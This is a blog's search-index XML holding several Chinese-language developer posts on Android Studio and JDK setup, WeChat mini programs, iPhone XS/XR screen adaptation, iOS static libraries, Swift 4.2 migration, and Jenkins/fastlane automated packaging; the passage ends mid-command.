<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Mac 安装Android Studio 及环境变量配置]]></title>
    <url>%2Farchives%2F67c8fe48.html</url>
    <content type="text"><![CDATA[我翻开历史一查，这历史没有年代。歪歪斜斜的每页上都写着“仁义道德”几个字，我横竖睡不着，仔细看了半夜，才从字缝里看出来，满本上都写着两个字“吃人”！ –鲁迅《狂人日记》 前言 最近想学一下Android开发，体会一下开源系统的魅力，第一步就是开发工具的安装和配置，因为Android的开发工具和JDK是分开下载和安装的，所以相对Xcode解压即用要稍微麻烦一点；所以记录一些安装过程。 下载开发工具 首先下载安卓开发和调试工具Android Studio，官方下载地址在这里，当然需要fq才可以；如果你不能fq，也可以在这里下载； 如果你之前比较喜欢使用jetbrains家的开发工具，那也可以继续使用他家的IDEA来进行Android开发和调试，要知道Android Studio也是基于IDEA的，而且如果你喜欢使用Kotlin，那就更不用担心了，因为Kotlin也是jetbrains家开源的编程语言🌝；下载地址在这里。 JDK 下载完开发工具，就需要下载JDK了。 JDK(Java Development Kit) 是 Java 语言的软件开发工具包(SDK)。在JDK的安装目录下有一个jre目录，里面有两个文件夹bin和lib，在这里可以认为bin里的就是jvm，lib中则是jvm工作所需要的类库，而jvm和 lib合起来就称为jre。 JRE（Java Runtime Environment，Java运行环境），包含JVM标准实现及Java核心类库。JRE是Java运行环境，并不是一个开发环境，所以没有包含任何开发工具（如编译器和调试器） JVM是Java Virtual Machine（Java虚拟机）的缩写，JVM是一种用于计算设备的规范，它是一个虚构出来的计算机，是通过在实际的计算机上仿真模拟各种计算机功能来实现的。 了解了什么是JDK之后，下载链接在这里。 安装安装JDK 首先安装jdk，直接点击安装包一步一步安装即可；比较简单直接略过。 配置JDK环境变量 安装完成jdk，就需要配置相关的环境变量，首先进入jdk的安装目录，在/Library/Java/JavaVirtualMachines/ 目录下，如果我的如下： 将上一步的jdk安装目录拷贝出来，配置如下环境变量： 123export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_172.jdk/Contents/Homeexport JAVA_HOMEexport PATH=$PATH:$JAVA_HOME 将上面的环境变量配置写入.bash_profile文件，可使用vim ~/.bash_profile指令进入文件后将上述变量拷贝进去，保存退出。 完成后执行source ~/.bash_profile指令使配置生效。 使用java -version指令查看配置是否生效。 也可以使用echo $JAVA_HOME指令查看： 安装Android Studio 直接双击Android Studio安装包打开，将Android Studio.app拖到Application目录中。 打开Android Studio，如果是新安装用户提示导入设置可直接选择不导入。 然后会提示无法访问SDK，可以暂时点击取消按钮跳过，后面配置。 然后就是一路点击下一步，即可；中间会让选择安装模式和主题，根据需要选择即可。 继续下一步，开始进入下载界面，等待下载完成即可。 全部下载安装完成后，就会进入Android Studio的启动界面，选择新建一个安卓项目开始体验，新项目配置比较简单，看一下就懂了，就不详细介绍了 配置完成进入主界面后会有错误提示，提示安装Build Tools，也就是之前缺少的SDK，直接点击安装即可 安装完成后就进入项目初始化配置同步和Gradle Build Running，这将是一个相当相当漫长的过程，等你熬过这个阶段基本就快完成了；建议可以去喝杯咖啡再回来。 模拟器 默认是没有安装模拟器的，不像Xcode，默认已经安装了一堆模拟器给你用。 点击右上角一个手机形状的图标，进入安卓虚拟设备管理（AVD）界面。 点击左下角的创建新的设备，进入设备列表安装即可。 Hello World 经过以上的步骤，安卓开发工具和环境变量都配置完成了，并且可以运行项目到模拟器中，运行到模拟器上就会出现熟悉的 Hello World 了。 剩下的就是开发工具按照你的个人习惯配置字体、字体大小、颜色等等细节了。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android Studio</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信小程序入坑]]></title>
    <url>%2Farchives%2Fc6d2cc27.html</url>
    <content type="text"><![CDATA[中国人的性情是总喜欢调和折中的，譬如你说，这屋子太暗，须在这里开一个窗，大家一定不允许的。但如果你主张拆掉屋顶他们就来调和，愿意开窗了。 –鲁迅《无声的中国》 前言 微信小程序实质上还是前端的网页的一套东西，腾讯基于浏览器内核封装了一部分常用功能和接口并提供出Api供开发者调用。 微信小程序的三种文件类型和前端开发的对应关系： wxml =&gt; html wxss =&gt; css js =&gt; js 优点 VS 不足优点 入门简单，封装了一大部分的常用的功能，如果有前端开发经验，一些前端的知识同样适用。 与微信对接，有微信庞大的日活用户。 入口比较多，用户安装使用门槛比较低，用完即走。 针对不懂的系统和手机型号适配相对比较简单（跨平台？）。 不足 安装包限制2M大小，只能做轻量级小程序。 一部分前端的东西是不适用小程序的，虽然入门简单，但是还是要学一部分微信封装的东西和一部分前端的知识。 开发工具真的是一坨屎，基本上连最基本的语法提示都做不到，完全考验记忆和英文水平，或者要不停的查文档。 对网络要求比较高，因为安装包大小限制决定了所有的数据必须走网络，如果网络不太好或者手机配置烂，绝对是噩梦的体验。 注意点 由于我是做iOS开发的，研究小程序也就一个多星期，可能对于很多特性和使用方法不是很正确，如有不当请指出。 引用 遇到一个功能总是想重构封装一下，以便复用，如网络请求模块，蓝牙模块等等； 之前在实现蓝牙数据交互的时候，将蓝牙连接，蓝牙数据按协议组装、蓝牙指令派发及数据解析完成回调、蓝牙数据解析、蓝牙验证等等功能抽成不同的模块在封装在js文件中，在外部引用的时候遇到了问题： 小程序require（‘相对/路径/功能.js’）必须是相对目录 无法引用绝对路径；官方说是历史包袱无法解决🌚 几种目录的区别： / 根目录 ./ 当前目录 ../父级目录 枚举类型 js是一种弱类型语言，是没有枚举类型的，如果想使用枚举类型，如定义蓝牙相关的指令，可以使用json数据格式来实现枚举的功能： 12345678910111213141516if (typeof BLECommand == "undefined") &#123; var BLECommand = &#123; // authorization GetRandomDigit: 0x00, /** 向设备获取随机数 */ AuthorizationAL1: 0x01, /** Rand + 设备序列号 生成Key1 */ EnterOTA: 0x02, /** OTA模式 */ DeviceBLEVersionInfo: 0x03, /** 版本信息 */ Read_Info: 0x05, Write_Info: 0x06, NoValidation: 0x07, /** 测试指令 不需要根据协议解析 */ &#125;&#125; 使用也比较简单，直接在需要引用的界面引入 1const BLEConfig = require('/pages/bluetooth/helper/ble-config.js') 按照正常的枚举类型方式使用即可 12console.log('GetRandomDigit ---' + BLEConfig.BLECommand.GetRandomDigit) // 0console.log('AuthorizationAL1 ---' + BLEConfig.BLECommand.AuthorizationAL1) // 1 页面跳转 navigateTo保留当前页面，跳转到新的页面，注意，如果项目架构是有tabBar的，那么跳转的新页面是不能已经划分到tabBar list的页面。 redirectTo将当前页面移除，替换为新的页面。 switchTab用于在tabBar页面中跳转，注意，加入app启动默认是授权或者介绍页面，此时没有显示tabBar，那么在进入到tabBar主界面时候需要使用switchTab才可以；之前使用navigateTo被坑死了。 标签 使用view标签，占一行，而text标签占用文字内容宽度 类似于span标签。 间距 margin和padding的设置方向相同 如果提供全部四个参数值，将按上、右、下、左的顺序作用于四边。 margin: 20rpx 10rpx 25rpx 10rpx 如果只提供一个，将用于全部的四边。 margin：20rpx 如果提供两个，第一个用于上、下，第二个用于左、右。 margin：20rpx 20rpx 如果提供三个，第一个用于上，第二个用于左、右，第三个用于下。 margin：20rpx 20rpx 10rpx 函数作用域问题12345678outerMethod() &#123; let that = this innerMethod(&#123; success: function (res) &#123; that.xxx() &#125;, &#125;) &#125;, 如果函数使用上面这种嵌套形式，要在内部要使用this，因为作用域的问题，需要在外部保留let that = this， 但是我们以另一种方式实现 1234567outerMethod() &#123; innerMethod(&#123; success: (res) =&gt; &#123; this.xxx() &#125;, &#125;) &#125;, swiper 使用swiper实现轮播图展览时候，如果想自定义swiper上面显示的页码指示的样式，则swiper中不要配置 indicator-dots，否则会显示默认样式。 隐藏Scroll View 的滚动条 如果我们想隐藏Scroll View 的滚动条，可以配置如下： 12345::-webkit-scrollbar &#123; width: 0; height: 0; color: transparent;&#125; 总结 总来来说，对于项目不是要求很高，用户体验要求也不是非常高，而且不想投入比较大的人力物力去开发的情况下，小程序也是一个比较好的选择； 但是小程序毕竟是小程序，缺点也同样明显，最终需要根据实际情况选择。]]></content>
      <categories>
        <category>weapp</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之新一代iPhone三剑客适配指北]]></title>
    <url>%2Farchives%2F3a74c3e3.html</url>
    <content type="text"><![CDATA[我像一根逃出火堆的干柴，幸运而孤单地站在远处。一根柴火看见一堆柴火慢慢被烧掉，然后熄灭。它自己孤单地朽掉，被别处的沙土掩埋。 –刘亮程《一个人的村庄》 前言 苹果爸爸又发新机了，而且一下发了三款，当时就感觉脑壳疼鸭脑壳疼。但是本着你爸爸还是你爸爸的原则，饭碗不能丢，只能带着发自内心的喜悦去适配，不过后来详细看了下发现需要适配的是真的多😂，不要怕，适配比较简单，我意思是我要适配的项目是真的多🌚。 关于适配 总的来说，适配也不是很麻烦，不要被一下发三款手机给吓到了，我们先理一理三款新机的规律： 机型名称 分辨率 点 几倍图 iPhone X 1125×2436 {375, 812} @3x iPhone XS 1125×2436 {375, 812} @3x iPhone XR 828x1792 {414, 896} @2x iPhone XS Max 1242x2688 {414, 896} @3x iPhone XS 和上一代的iPhone X完全保持一致，就不需要适配了。 iPhone XR 和 iPhone XS Max虽然分辨率不一样，但是物理尺寸是一样的，而且宽度和之前的plus机型保持一致。 启动适配 启动图这部分就不需要我们考虑了，设计会直接出新的两张启动图给我们，直接放在LaunchImage里面对应位置就可以了，如果你们的设计不知道出多大的图，就按着上面表格的分辨率出就可以了。 关于启动图需要注意的一点就是，如果是Xcode 10可能会出现LaunchImage没有发新机型的位置，此时需要查看适配启动图有没有选项少勾选： 内容适配 关于内容适配，无非就是适配导航栏和底部Tabbar，在之前适配iPhone X 的地方再添加iPhone XS的判断，后面需要多加一个分支判断iPhoneXR或者iPhone XS Max即可。如果你之前只是针对是否全面屏做的事情都是一样，那么你可以更简单的将iPhone X的判断替换为isFullScreen即可。 123456789101112131415// 常规屏幕尺寸#define is_3_5Inch ([UIScreen mainScreen].bounds.size.height == 480)#define is_4_0Inch ([UIScreen mainScreen].bounds.size.height == 568)#define is_4_7Inch ([UIScreen mainScreen].bounds.size.height == 667)#define is_5_5Inch ([UIScreen mainScreen].bounds.size.height == 736)// 全面屏尺寸#define is_iPhoneX ([UIScreen instancesRespondToSelector:@selector(currentMode)] ? CGSizeEqualToSize(CGSizeMake(1125, 2436), [[UIScreen mainScreen] currentMode].size) &amp;&amp; !is_Pad : NO)#define is_iPhoneXR ([UIScreen instancesRespondToSelector:@selector(currentMode)] ? CGSizeEqualToSize(CGSizeMake(828, 1792), [[UIScreen mainScreen] currentMode].size) &amp;&amp; !is_Pad : NO)#define is_iPhoneXS ([UIScreen instancesRespondToSelector:@selector(currentMode)] ? CGSizeEqualToSize(CGSizeMake(1125, 2436), [[UIScreen mainScreen] currentMode].size) &amp;&amp; !is_Pad : NO)#define is_iPhoneXS_Max ([UIScreen instancesRespondToSelector:@selector(currentMode)] ? CGSizeEqualToSize(CGSizeMake(1242, 2688), [[UIScreen mainScreen] currentMode].size) &amp;&amp; !is_Pad : NO)/// 是否是全面屏（刘海屏）#define isFullScreen (is_iPhoneX || is_iPhoneXR || is_iPhoneXS || is_iPhoneXS_Max) 关于导航栏和底部工具条的常用尺寸，用于我们设置自定义控件位置时使用： 12345678910/// 状态栏高度#define XSStatusBarH [[UIApplication sharedApplication] statusBarFrame].size.height/// 导航栏高度#define XSNavigationBarH (XSStatusBarH + 44)// 底部横条 和 底部工具条Tabbar#define XSHomeIndicatorH (isFullScreen ? 34.f : 0.f)#define XSHomeIndicatorTopMargin (isFullScreen ? 20.f : 0.f)#define XSHomeIndicatorBottomMargin (isFullScreen ? 14.f : 0.f)#define XSTabbarH (isFullScreen ? XSHomeIndicatorH + 49.f : 49.f) 参考Human Interface Guidelines]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>iPhone X</tag>
        <tag>iPhone XS</tag>
        <tag>iPhone XR</tag>
        <tag>iPhone XS Max</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之关于静态库制作及注意点]]></title>
    <url>%2Farchives%2Fa9b5807a.html</url>
    <content type="text"><![CDATA[在那时候，那些东西不转身就正面背面都领受到了月光，我不回头就看见了过往。 –刘亮程《今生今世的证据》 前言 使用库无外乎就是两种情况：一种是将源码的实现细节隐藏，只给外部调用的接口集成特定的服务，如常见的百度/谷歌地图等等第三方库；另一种就是防止公司的核心代码泄露，将核心功能的源码打成库文件集成。 静态库的制作并不难，但是像我这样距离上次制作静态库都几年了的人应该也不少，重新上手又要去查指令什么的😂，所以就将过程及注意点记录下来，以后再需要就比较好翻阅了。 关于库 库一般分为静态库和动态库两种，其本质上来说是可以被载入内存中执行的可执行代码的二进制格式。 iOS中的静态库有.a 和 .framework两种形式；动态库有.dylib 和 .framework 形式，.dylib动态库从Xcode 8开始以.tbd的形式出现。 动态库和静态库的区别： 静态库在链接时会被完整的复制到可执行文件中，被多次使用就有多份冗余拷贝。 动态库链接时不复制，程序运行时由系统动态的加载到内存供程序调用，系统只加载一次，多个程序共用，节省内存。 .a静态库 和 .framework静态库区别 .a静态库是纯二进制文件，不能单独使用，一般需要配合头文件使用。 .framework静态库可以单独使用，并且可以集成资源文件，类似于.a + .h + sourceFile = .framework。 .a静态库库文件生成 新建项目，如图选择新建静态库： 静态库命名一般以lib开头，后面加上静态库的功能，如我这个静态库用于蓝牙加解密，所以命名为libBLECrypto。 完成之后会自动生成项目名称同名的.h和.m文件。 我们根据需求实现功能及导入相关的文件，此时如果我们不编译，默认Products目录下会有一个红色的lib+ 项目名称 + .a的文件。 Command + B 编译一下项目，此时该文件变为黑色。我们在该.a文件上右键Show in Finder，进入其所在位置，实质上项目中的.m文件已经生成.a文件了。但是此时别人是无法使用的，因为缺少对应的头文件，我们需要再如下位置配置需要暴露给外界的头文件信息： 配置完成后重新Command + B 编译后会发现在原来生成的.a文件的同级目录会生成一个include目录，里面就是需要一起提供给调用者的头文件信息。 进行到这里是不是感觉.a静态库的制作很简单？不要闹，我们还有更重要的事情没有解决呢。 环境及平台处理 我们知道生成的静态库可能用于Debug模式，也可能用于Release模式；可能是在模拟器上面运行，也可能是在真机上运行，既然有这么多可变因素，那么我们就需要一一解决。 我们首先将不同的开发模式和不同的运行环境下生成对应的库文件（共4种）： 模拟器 + Debug 模拟器 + release： 真机 + Debug 真机 + release 这里有一个注意点，需要将构建建构设置为NO，否则只支持选中的设备架构： 使用lipo -info命令查看静态库支持的CPU架构，如 可以看出使用真机编译生成的静态库是支持armv7 arm64架构的，使用模拟器编译生成的静态库是支持i386 x86_64架构的（armv7是兼容armv7s的）。 关于设备的CPU架构(指令集) 模拟器: i386 : 32位架构 4S ~ 5 x86_64 : 64位架构 5S ~ 现在的机型 真机(iOS设备): armv7 : 32位架构 3GS ~ 4S armv7s: 特殊的架构 5 ~ 5C (此架构有问题, 有的程序变得更快, 有的程序变得更慢) amr64 : 64位架构 5S ~ 现在的机型 根据使用者的需求，将对应的库文件及头文件提供给调用者即可，但是如果在模拟器和真机之间切换使用这样比较麻烦，所以需要将两个静态库合并为一个静态库供别人使用。 静态库合并 将静态库合并也比较简单，只需要需要支持的架构的静态库合并即可，一般我们主要合并模拟器Release下的静态库和真机Release下的静态库，保证在模拟器和真机下都可以调试并且可以发布应用。合成指令如下： 1lipo -create 静态库1.a 静态库2.a -output 新静态库.a 合成完成会生成一个新的.a静态库，将该.a静态库和头文件一起提供给调用者即可。 关于静态库上架 如果项目中导入了.a静态库且上架需要开启Bitcode选项，那么静态库就需要支持Bitcode才可以，否则打包上架会遇到如下问题： 1ld: bitcode bundle could not be generated because &apos;xxx.a(xxx.o)&apos; was built without full bitcode. 让静态库支持，需要在编译生成静态库文件前进行下面两步配置 需要在Build Settings 中设置Enable Bitcode选项为Yes（默认是开启状态）。 在Build Settings的Other C Flags 添加-fembed-bitcode参数。 检查生成的静态库文件是否支持Bitcode，请使用如下指令： 123otool -arch armv7 -l libBLECrypto.a 或者otool -arch arm64 -l libBLECrypto.a Command + F搜索bitcode字段，如果存在sectname为bitcode的字段且对应的size不是0x0000000000000001，说明静态库支持Bitcode。 framework静态库 用到了再补充🌝🌚。 注意点 如果静态库中使用到分类，那么直接使用静态库会有找不到该方法的运行时错误（selector not recognized），解决办法是：在使用静态库的工程中配置other linker flags的添加-ObjC。 如果一个静态库很复杂，需要暴露的.h比较多的话，就可以在静态库的内部创建一个.h文件（一般这个.h文件的名字和静态库的名字相同），然后把所有需要暴露出来的.h文件都集中放在这个.h文件中，而那些原本需要暴露的.h都不需要再暴露了，只需要把.h暴露出来就可以了。 如果我们在同一电脑行生成静态库并配置到其他项目中，此时在项目中打断点是可以进入静态库的实现文件中的，不过不用担心，在其他电脑是以汇编形式显示的。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>静态库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Swift项目版本4.0迁移4.2记录]]></title>
    <url>%2Farchives%2Fdd5e907.html</url>
    <content type="text"><![CDATA[阳光倾泻而下，他的身影穿过院子，提利昂·兰尼斯特昂首挺立，仿佛是一位国王。 –《 冰与火之歌》 前言 一路从Xcode 10的Beta版试用下来，总的来说这一版本的Xcode相比之前还算是有很大提升的，至少感觉和历代相比第一个测试版就赢在起跑线上了，虽然并没有加入非常多酷炫的功能，但是在一些细节的打磨上个人还是比较喜欢的。 随着Xcode 10正式版的发布，我们也终于迎来了swift 4.2，因为Swift 4.2 是为 Swift 5 的 ABI 稳定性做准备，虽然包含了一些底层 ABI 的变化，具体的变化请参考官方博客，相较于上一个版本变化并不是非常的大。 迁移 Swift版本迁移实质上两部分的迁移：第一部分是项目中用到的三方库的版本升级；第二部分是我们主项目版本迁移。 主项目迁移 首先在项目的Build Setting 中将Swift版本设置为最新的版本4.2， 如下图： 在Edit -&gt; Convert -&gt; To Current Swift Syntax进行转换。 勾选需要转换的指定的Targets，此时如果还没有更新三方库或者部分三方库还未适配Swift4.2，可以只勾选我们需要的Targets即可，如只勾选主Target。 完成后直接点击下一步等待完成。 转换完成，就会弹出如下编辑界面，将项目中需要修改的地方一一修改即可，都是一些语法变化相关的，大部分根据提示自动修复即可。 修改完成，点击保存，重新编译项目。 三方库迁移 关于三方库的迁移，一般我们在项目中使用的都是比较流行的开源库，所以这些库的维护和更新是非常频繁和及时的，我们可以将我们用到的三方库列一个表，然后具体查看升级swift4.2的情况，基本上如果这些库是比较热门的，一两天内就会适配swift4.2，即使没有适配我们也可以单独只迁移适配过的库。 首先，将本地的Pod仓库和使用的库更新到最新版本，如下图： 然后选择Edit -&gt; Convert -&gt; To Current Swift Syntax进行转换，注意在勾选需要转换的Target的时候根据我们具体用到的已经升级swift4.2的库勾选即可，没有升级适配swift4.2的库可以先不要勾选，等以后适配了在迁移，如果一切正常，就可以开心的喝着咖啡、吃着零食等下班了。]]></content>
      <categories>
        <category>Swift</category>
      </categories>
      <tags>
        <tag>Swift</tag>
        <tag>iOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之使用JenKins & fastlane 实现自动打包及持续集成]]></title>
    <url>%2Farchives%2F56d26041.html</url>
    <content type="text"><![CDATA[枯藤老树昏鸦，小桥流水人家，古道西风瘦马。夕阳西下，断肠人在天涯。 ——马致远《天净沙·秋思》 简介 持续集成是一种软件开发实践：许多团队频繁地集成他们的工作，每位成员通常进行日常集成，进而每天会有多种集成。每个集成会由自动的构建（包括测试）来尽可能快地检测错误。许多团队发现这种方法可以显著的减少集成问题并且可以使团队开发更加快捷。 这里有一篇关于持续集成的详细介绍Continuous Integration 以及对持续集成好处的总结Top benefits of continuous integration 虽然我们很多开发者一直用持续集成，但是就像是开发者账号一样，可能进公司就已经完善了，你只需要使用就可以，从来没有自己亲自动手搭一套持续集成的及打包的环境。刚好最近手头的工作不忙了，然后就忍不住想折腾，随将折腾的过程及踩的坑记录于此。 Jenkins Jenkins是一款由Java编写的开源的持续集成工具。 提供了一种易于使用的持续集成系统，使开发者从繁杂的集成中解脱出来，专注于更为重要的业务逻辑实现上。同时 Jenkins 能实施监控集成中存在的错误，提供详细的日志文件和提醒功能，还能用图表的形式形象地展示项目构建的趋势和稳定性。 Jenkins安装 Jenkins本身是基于java语言开发的，所以安装Jenkins之前，要保证你的电脑有java的jdk，请自行去这里下载对系统安装即可。 关于Jenkins的安装有两种方式，一种是直接下载安装包安装，一种是使用包管理工具安装。 安装包 通过安装包安装，首先需要去这里下载指定的安装包，如jenkins-2.138.1.pkg，双击安装即可，根据提示下一步。 注意的地方在安装类型这一步，选择自定义，然后取消 start at boot as“jenkins”选项，之后一直根据提示就可以安装成功。 安装完成后应该会自动打开一个jenkins的密码页面，如果没有自动打开，请在终端输入如下指令： 1open /Applications/Jenkins/jenkins.war 根据提示需要将/Users/Shared/Jenkins/Home/secrets/目录下initialAdminPassword文件中的密码输入到输入框中，但是我们会发现secrets目录是没有权限访问的，此时就需要在secrets文件夹右键显示简介，然后把所有人的权限设置为可读，如果initialAdminPassword还是无法访问，依然需要将它权限设置为可读，直接打开获取密码或者使用如下指令： 1sudo cat /Users/Shared/Jenkins/Home/secrets/initialAdminPassword 输入密码登录 输入密码之后就可以根据提示，先安装推荐的一些插件： 完成之后就可以根据提示，创建一个管理员账号： homebrew（推荐） 使用homebrew安装是比较推荐的一种安装方式，因为直接使用安装包默认会安装在/Users/Shared/Jenkins/目录下，后续使用可能会出现各种权限问题，所以推荐使用homebrew的安装方式，不仅简单，而且是安装在用户目录下，后续比较省事少折腾。 在终端输入如下指令，等待安装完成即可： 1brew install jenkins 安装完成，直接在终端输入下面指令启动Jenkins： 1jenkins 启动完成后就可以通过http://localhost:8080/访问Jenkins管理界面。 默认端口为8080，如果出现端口冲突需要修改端口（如：8888） 1defaults write /Library/Preferences/org.jenkins-ci httpPort 8888 之后就和安装包安装一样，需要安装一些默认推荐的插件。 Jenkins卸载 使用 Jenkins 的pkg安装包默认安装位置为/Users/Shared/Jenkins/目录，后续会遇到莫名其妙的权限问题，主要原因还是对原理不是很熟悉。 所以如果已经使用pkg安装包安装过需要卸载：进入 /Library/Application Support/Jenkins/ 目录下双击执行Uninstall.command文件卸载即可。 常用插件 插件安装目录在系统管理-&gt;管理插件的可选插件中。 首先需要安装源码管理的git插件，因为我们公司是使用GitLab管理代码，所有需要先安装GitLab Plugin和Gitlab Hook Plugin这两个插件。 需要使用Xcode编译环境，安装Xcode integration插件。 为了管理打包证书，需要安装Keychains and Provisioning Profiles Management插件。 任务 准备就绪之后就可以构建一个项目了，一个项目就是一个任务，所以我们先新建一个任务。 新建完一个任务后，就可以进入任务配置界面。 General 项目描述信息，根据项目选填。 主要配置一下构建保留的天数和数量信息。 源码管理 由于现在我们用到的是GitLab，先配置SSH Key，在Jenkins的证书管理中添加SSH用于获取拉取项目的权限。 在Jenkins管理页面，选择“Credentials”，然后选择“Global credentials (unrestricted)”，点击“Add Credentials”，如下图所示，我们填写自己的SSH信息，然后点击“Save”，这样就把SSH添加到Jenkins的全局域中去了。 然后在git源码管理界面输入项目的仓库地址，并选择上一步配置的证书；选择每次打包的源码的分支，默认是指定主分支。 1ssh://git@192.168.0.28:30001/KYDW_301/iOS_KYDW_301.git 构建触发器 主要用于自动测试流程相关的，用到后再详细研究相关功能及设置，常用触发方式有以下几种。 远程触发，使用地址+token的方式触发。 Poll SCM (poll source code management) 轮询源码管理，需要设置源码的路径才能起到轮询的效果。一般设置为类似结果： 0/5 * * * * 每5分钟轮询一次。 设置定时触发，如设置为类似： 00 20 * * * 每天 20点执行定时build 。。 构建环境 iOS打包需要签名文件和证书，所以勾选Keychains and Code Signing Identities和Mobile Provisioning Profiles。 这里我们需要用到Jenkins的插件，进入系统管理页面，选择Keychains and Provisioning Profiles Management。 进入Keychains and Provisioning Profiles Management页面，点击浏览按钮，分别上传自己的keychain和证书。上传成功后，我们再为keychain指明签名文件的名称，最后添加Add Code Signing Identity。 这里需要的Keychain，并不是cer证书文件。 这个Keychain其实在/Users/管理员用户名/Library/keychains/login.keychain，当把这个Keychain设置好了之后，Jenkins会把这个Keychain拷贝到/Users/Shared/Jenkins/Library/keychains这里，(Library是隐藏文件)。 Provisioning Profiles文件也直接拷贝到/Users/Shared/Jenkins/Library/MobileDevice文件目录下。 证书和签名文件在Jenkins中配置好后，接下来回到项目构建环境界面选择对应的证书和签名文件。 构建 根据自己的需要，选择不同的构建步骤。 已经默认有很多可用的脚本，可根据需要选择，也可以自定义添加一系列的构建步骤，一个一个的执行。 构建后操作 构建完成后执行的操作，如上传到App Store Connect、内部测试使用、发邮件通知等等。 可根据需要添加多个构建步骤。 fastlane 对于小团队，不像大公司那样对产品的测试和发布有专门的测试人员，按照严格的程序执行，所以使用fastlane搭建一个轻量级的一键导出安装包及自动化发布的平台会是一个不错的选择。 我们传统使用XCode打包Product ——&gt;Archive ——&gt;Upload to AppStore / Export，需要手动一步步选择、等待、最后导出安装包（想想就麻烦）；使用自动打包命令只需在终端输入相应的指令，然后就可以喝着咖啡等待导出ipa安装包成功，或者自动发布到测试平台（蒲公英或者fir.im）和App Store即可，省工、省时、省力，省心。 关于自动打包&amp;发布 自动打包可用的选项： 将xcodebuild命令封装成一套shell执行脚本，需要打包时候执行即可。 使用Python封装一套自动打包指令。 使用fastlane搭建自动打包发布平台。 关于fastlane fastlane是用Ruby实现的一套自动化命令工具集。可以自动导出ipa包，自动发布测试平台或App Store，甚至简单配置后可以自动截取上架的预览图及自动提交审核。 同时fastlane是适用于Android和iOS两个平台的。 安装 因为fastlane是基于Ruby实现，首先需要安装Ruby，Mac系统是自带Ruby的，可以在终端输入如下命令查看Ruby版本： 1ruby -v 检查 Xcode 命令行工具是否安装，在终端输入如下命令： 如果未安装命令行工具，终端会自动开始安装。 如果提示command line tools are already installed, use &quot;Software Update&quot; to install updates.说明已经安装过。 1xcode-select --install 安装fastlane，在终端输入如下命令： 1sudo gem install fastlane -NV 如果使用homebrew的用户，推荐使用这种方式安装： 1brew cask install fastlane fastlane 配置 安装好fastlane后，就可以针对不同的项目配置fastlane。 首先，终端cd进入需要配置自动化流程的项目的根目录，在终端输入如下命令： 1fastlane init 执行初始化命令后，默认提供了一共4种的常用的自动化配置，选择任何一种都可以，我们都可以再进行自定义： 1、自动截取屏幕作为预览图（需要配合 UITest ）； 2、发布发布 TestFlight 测试包； 3、发布到 App Store； 4、自定义自动化脚本配置； 如，我们默认选择发布到 App Store 的选项， 此步骤会提示输入 Apple ID 账号和密码，如果开启了双重验证还需要输入验证码。 如果项目还未在 苹果开发者网站配置过，会提示是否需要在苹果开发者网站创建对应的应用，可以输入n不要自动创建项目。 提示是否建立和 App store 连接，也直接输入n。 然后等待配置完成即可。 安装完成后，项目的根目录会多一个名为fastlane的目录，该文件下有两个文件： Appfile：用来配置项目相关的应用信息，如app_identifier，apple_id和team_id的信息。 Fastfile：用来管理和创建的所有自定义的自动化lane步骤，lane可以理解为 fastlane 的执行脚本，一个Fastfile 里可以编写任意个lane，每个lane都可以独立运行，也可以嵌套运行。 例如，我们定义一个自动打内测包的lane，这样就不需要每次打测试包的时候选环境，选签名证书，然后Xcode一步步导出了： 具体每个字段的意思请参考注释和官方文档。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# 在所有操作之前需要做的事情 例如安装项目依赖库 同`pod install`before_all do # cocoapods end displayName = "KYPetNearby" # 导出的包名 archiveTime = Time.new.strftime("%Y%m%d%H%M%S") # 包名_20181229161646 desc "Archive and export an Ad-Hoc ipa package" lane :adhoc do # 打adhoc包 （此lane动作名称 用于触发对应流程） # build_app 和 gym 都是 build_ios_app的别名 build_app( workspace: "KYPetNearby.xcworkspace", scheme: "KYPetNearby", # 工程下要打包的项目,如果一个工程有多个项目则用[项目1,项目2] clean: true, # 在构建前先clean silent: true, # 终端不显示不需要的信息 默认是false include_bitcode: false, # 是否包含bitcode configuration: "Release", # 打包配置 export_method: "ad-hoc", # 指定打包所使用的输出方式，app-store, ad-hoc, package, enterprise, development, developer-id，即xcodebuild的method参数 output_directory: './Archive', # 打包后的 ipa 文件存放的目录 (项目根目录) # output_directory:"/Users/⁨sevencho⁩/Desktop/Archive" # 打包后的 ipa 文件存放的目录 (桌面) output_name: "#&#123;displayName&#125;_adhoc_#&#123;archiveTime&#125;", # ipa 文件名 export_options: &#123; method: "ad-hoc", # 指定打包的项目对应的描述文件 格式如下 provisioningProfiles: &#123; "com.xxxx.KYPetNearby" =&gt; "Seven_adHoc_distribution", &#125; &#125; ) # pgyer(api_key: "api key", user_key: "user key", update_description: "正在将安装包上传到蒲公英") #上传到蒲公英 # firim(firim_api_token: [firim_api_token]) #上传到firim puts("-------------------------------------------------") puts("------------ 构建并导出Ad-Hoc ipa成功 -------------") puts("-------------------------------------------------") end # 所有动作完成之后的流程 after_all do |lane| # This block is called, only if the executed lane was successful # slack( # message: "Successfully deployed new App Update." # ) end # 出现错误触发的流程 error do |lane, exception| slack( message: exception.message, success: false ) end 多 Target 配置 注意点，需要在xcode开发工具中scheme管理界面将scheme的shared勾选上。 上面的只是基本的针对项目单 Target 的配置，但是如果有多个 Target 那么就需要额外的配置，具体如下: 配置.env 文件 工程里面有几个traget，需要创建几个.env。 该文件中主要就是自定义临时变量，供 Appfile, Deliverfile和 Fastfile使用。 其他配置文件可通过 ENV[&#39;自定义字段名称&#39;] 来读取变量值。 fastlane 调用时，通过添加参数 --env来指定待读取的 .env 文件，或者再包装一层自定义的lane来调用对应环境的lane脚本。 如 我们有2个target，分别是KYAnimalLocation 和KYAnimalLocationInternational，那么需要创建两个 .env文件，可以在终端进入项目根目录，使用如下指令创建： 12touch .env.KYAnimalLocationtouch 